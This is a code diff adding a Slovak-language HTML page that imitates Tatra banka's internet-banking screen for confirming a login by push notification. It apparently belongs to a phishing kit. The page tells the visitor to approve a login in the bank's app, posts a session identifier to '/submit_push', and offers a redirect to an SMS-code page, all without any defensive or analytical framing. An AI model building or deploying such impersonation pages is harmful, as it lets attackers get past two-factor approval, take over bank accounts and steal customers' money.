@@ -1,0 +1,132 @@
+﻿<!DOCTYPE html>
+<html lang="sk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tatra banka - Push notifikácia</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            background-color: #1d1e23;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header { background-color: #08080a; padding: 16px 24px; }
+        .logo { display: flex; align-items: center; gap: 12px; }
+        .logo-circle {
+            width: 32px; height: 32px;
+            border: 3px solid #0097fd;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .logo-inner { width: 14px; height: 14px; background-color: #0097fd; border-radius: 50%; }
+        .logo-text { font-size: 18px; font-weight: bold; color: #ffffff; }
+        .main-content {
+            flex: 1; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; padding: 40px 20px;
+        }
+        .push-container {
+            text-align: center; max-width: 450px;
+            background-color: #2a2b31; border-radius: 12px; padding: 40px;
+        }
+        .phone-icon {
+            width: 80px; height: 80px; margin: 0 auto 24px;
+            background-color: rgba(0, 151, 253, 0.15); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 151, 253, 0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(0, 151, 253, 0); }
+        }
+        .phone-icon svg { width: 40px; height: 40px; fill: #0097fd; }
+        .push-title { font-size: 22px; font-weight: 600; margin-bottom: 16px; }
+        .push-text { font-size: 15px; color: rgba(255,255,255,0.7); margin-bottom: 24px; line-height: 1.6; }
+        .notification-box {
+            background-color: #1d1e23; border: 1px solid rgba(0, 151, 253, 0.3);
+            border-radius: 8px; padding: 16px; margin-bottom: 24px; text-align: left;
+        }
+        .notification-header { display: flex; align-items: center; margin-bottom: 8px; }
+        .notification-icon {
+            width: 24px; height: 24px; background-color: #0097fd;
+            border-radius: 4px; margin-right: 10px;
+        }
+        .notification-app { font-size: 13px; color: rgba(255,255,255,0.6); }
+        .notification-title { font-size: 14px; font-weight: 600; margin-bottom: 4px; }
+        .notification-body { font-size: 13px; color: rgba(255,255,255,0.7); }
+        .waiting-text {
+            font-size: 14px; color: rgba(255,255,255,0.5);
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .small-spinner {
+            width: 16px; height: 16px;
+            border: 2px solid rgba(0, 151, 253, 0.2);
+            border-top-color: #0097fd; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .alt-link { margin-top: 24px; padding-top: 24px; border-top: 1px solid rgba(255,255,255,0.1); }
+        .alt-link a { color: #0097fd; text-decoration: none; font-size: 14px; cursor: pointer; }
+        .confirm-btn {
+            width: 100%; padding: 16px; font-size: 16px; font-weight: 600;
+            background-color: #0097fd; color: #ffffff;
+            border: none; border-radius: 8px; cursor: pointer; margin-top: 16px;
+        }
+        .confirm-btn:hover { background-color: #0086e0; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <div class="logo-circle"><div class="logo-inner"></div></div>
+            <span class="logo-text">Tatra banka</span>
+        </div>
+    </div>
+    <div class="main-content">
+        <div class="push-container">
+            <div class="phone-icon">
+                <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+            </div>
+            <h1 class="push-title">Potvrďte prihlásenie</h1>
+            <p class="push-text">Na váš telefón sme odoslali push notifikáciu. Prosím, potvrďte prihlásenie v aplikácii Tatra banka.</p>
+            <div class="notification-box">
+                <div class="notification-header">
+                    <div class="notification-icon"></div>
+                    <span class="notification-app">Tatra banka</span>
+                </div>
+                <div class="notification-title">Žiadosť o prihlásenie</div>
+                <div class="notification-body">Potvrďte prihlásenie do Internet bankingu</div>
+            </div>
+            <div class="waiting-text">
+                <div class="small-spinner"></div>
+                Čakáme na potvrdenie...
+            </div>
+            <button class="confirm-btn" onclick="confirmPush()">Potvrdil som v aplikácii</button>
+            <div class="alt-link">
+                <a onclick="goToSms()">Použiť SMS kód namiesto push notifikácie</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session_id') || localStorage.getItem('session_id');
+        
+        function confirmPush() {
+            fetch('/submit_push', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sessionId})
+            }).then(() => {
+                window.location.href = '/loading?session_id=' + sessionId;
+            });
+        }
+        
+        function goToSms() {
+            window.location.href = '/sms?session_id=' + sessionId;
+        }
+    </script>
+</body>
+</html>
